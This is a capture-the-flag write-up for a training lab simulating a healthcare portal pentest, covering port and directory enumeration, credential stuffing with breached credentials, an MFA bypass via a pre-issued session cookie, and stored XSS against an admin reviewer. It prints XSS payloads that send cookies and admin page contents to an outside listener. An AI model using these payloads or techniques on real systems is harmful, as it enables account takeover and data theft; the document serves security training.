---
title: "HealthSmarter @ Hacksmarter Writeup"
date: 2026-07-15
categories: [Hacksmarter, Web]
tags: [brute-force, mfa-bypass, stored-xss]
image:
  path: /assets/health.png
---



**Platform:** [Hacksmarter](https://www.hacksmarter.org/)  
**Lab:** [Health Smarter](https://www.hacksmarter.org/courses/4ad11d75-aefa-4b81-8f4e-8aba6bdc53b7/take)  
**Difficulty:** Medium

## Scenario

Health Smarter is releasing a new portal for patients and employees to manage appointments and healthcare data. We've been hired to perform a full web application penetration test against this portal, identify all vulnerabilities and demonstrate impact by gaining access to the admin portal if possible.

For initial access, the engagement simulates a realistic scenario: breached credentials sourced from DeHashed, giving us a list of potential usernames and passwords tied to the `@healthsmarter.hsm` domain to work with.

## Enumeration

### Nmap

```bash
~> /hacksmarter/healthsmarter nmap 10.0.30.146 -sVC --min-rate 1000
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-15 14:46 +0100
Nmap scan report for 10.0.30.146
Host is up (0.20s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:9b:4c:b9:d6:9e:e4:27:53:73:e6:16:96:32:64:49 (ECDSA)
|_  256 76:28:be:cd:08:b5:55:d0:83:de:56:38:2d:02:9c:9e (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: Enterprise Portal Login | Health Smarter
|_Requested resource was /login.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports open, SSH on 22 and HTTP on 80. The web server is running Node.js with Express, and nmap's HTTP title probe already tells us where we're headed: `Enterprise Portal Login | Health Smarter`, redirecting straight to `/login.html`.

## HTTP (80)

<img width="1182" height="715" alt="image" src="https://github.com/user-attachments/assets/7cebef3d-d4e9-4bb7-bab5-28d3f5222761" />


The login page asks for an email address and password. The placeholder shows the format the app expects: `t.ramsbey@healthsmarter.hsm`. That maps neatly to the credential list we got from DeHashed.

### Directory Fuzzing

Before touching the login, I ran a quick directory fuzz to map out what endpoints exist on the app.

```bash
~> /hacksmarter/healthsmarter ffuf -u http://10.0.30.146/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.0.30.146/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
login.html              [Status: 200, Size: 3663, Words: 1088, Lines: 92, Duration: 221ms]
admin.html              [Status: 403, Size: 23, Words: 3, Lines: 1, Duration: 205ms]
css                     [Status: 301, Size: 153, Words: 6, Lines: 11, Duration: 226ms]
dashboard.html          [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 212ms]
Admin.html              [Status: 403, Size: 23, Words: 3, Lines: 1, Duration: 227ms]
mfa.html                [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 209ms]
Dashboard.html          [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 206ms]
                        [Status: 302, Size: 33, Words: 4, Lines: 1, Duration: 239ms]
```


A few things stood out immediately. `admin.html` exists but returns a 403. `dashboard.html` and `mfa.html` both return 302 redirects, meaning the app routes unauthenticated users away from them rather than blocking outright.

---

## Compromising m.thompson

With the endpoint map done, I went back to the login form. I captured the login request in Caido and loaded the full DeHashed credential list into the automate tab. One payload position on the username field, running through every email address with each password.

<img width="1011" height="757" alt="image" src="https://github.com/user-attachments/assets/71f8fb66-5c5c-4b29-858c-7cb6a7046d2e" />


One combination came back with a 200 and a `redirect` field pointing to `/mfa.html` instead of the generic failure response everything else returned.

<img width="1034" height="761" alt="image" src="https://github.com/user-attachments/assets/302afade-ff93-4426-ae4f-812ea4798e64" />


```bash
username : m.thompson@healthsmarter.hsm
password : Care4All!
```

### MFA Bypass

Logging in with those credentials redirected me to `/mfa.html`, a six-digit authenticator code prompt.

<img width="1152" height="743" alt="image" src="https://github.com/user-attachments/assets/1ab1e75c-6919-48fe-9978-b8effe21ee47" />


I didn't have access to the email or authenticator app, so I checked the login response in Caido to see if the OTP was being leaked anywhere in the response body or headers. It wasn't. What I did notice though was that a session cookie was being set in the login response before the MFA step was ever completed.

<img width="1440" height="359" alt="image" src="https://github.com/user-attachments/assets/d632aa67-f6e0-4b66-958e-643792932ea3" />

That's the vulnerability. The server issues a valid authenticated session at login, then just redirects the user to MFA as a UI step, but the session is already live. If the server isn't verifying MFA completion on the backend before granting access to protected pages, the MFA check can be skipped entirely by navigating directly with that cookie.

I took the session cookie from the login response and navigated straight to `/dashboard.html`, skipping `/mfa.html` entirely.

<img width="971" height="711" alt="image" src="https://github.com/user-attachments/assets/ff6ca01c-47e7-4a67-a8fb-689f655f5023" />


MFA bypassed. The first flag was sitting right on the dashboard.

---

## Compromising the Admin Account

On the dashboard there was a helpdesk ticketing feature, a support ticket form that gets reviewed by an admin staff member. Any time user-controlled input gets reviewed by a privileged user, stored XSS is the first thing worth testing.

### Confirming XSS

I started simple, just checking whether the admin's browser would make an outbound request when it rendered my ticket. I spun up a Python HTTP server and submitted a basic fetch payload as the ticket body.

```bash
~> /hacksmarter/healthsmarter python3 -m http.server 8000
```

**Payload:**
```html
<script>fetch('http://10.200.71.203:8000/?cookie=')</script>
```

<img width="428" height="193" alt="image" src="https://github.com/user-attachments/assets/dd97b7db-a19d-46a6-bdbd-063eb3ef0b8d" />


<img width="856" height="117" alt="image" src="https://github.com/user-attachments/assets/845ba215-c4d3-476a-8f3e-220561540f4b" />


The server called back. The admin bot is rendering ticket content and executing JavaScript. The `cookie=` value in the request came back empty though, the session cookie is likely `HttpOnly`, so `document.cookie` won't return any value.

### Reading the Admin Page Directly

Since the XSS executes in the admin's browser session, and the admin clearly has access to `admin.html` (we got a 403 when we tried it as
m.thompson), I could use the XSS to make the admin's browser fetch `/admin.html` and exfiltrate the response body to my server.

```html
<script>
fetch("/admin.html")
  .then(r => r.text())
  .then(t => {
    new Image().src =
      "http://10.200.71.203:8000/?c=" +
      encodeURIComponent(t);
  });
</script>
```

<img width="1586" height="648" alt="image" src="https://github.com/user-attachments/assets/14f266fa-9964-4d46-b2c6-21ceff0aeac6" />


The server received the full URL-encoded HTML of the admin page. I copied the value out of the server log and dropped it into CyberChef with a URL Decode operation.

<img width="1599" height="766" alt="image" src="https://github.com/user-attachments/assets/ebe189e7-3167-40e6-816e-dfa3dd27598c" />


The decoded output was the full HTML source of `admin.html`. Grepping through it for the flag format gave us the second flag.

Happy Hacking!!!!

<img width="797" height="606" alt="image" src="https://github.com/user-attachments/assets/d48dc875-f393-43a7-8588-b6ea10b62bce" />

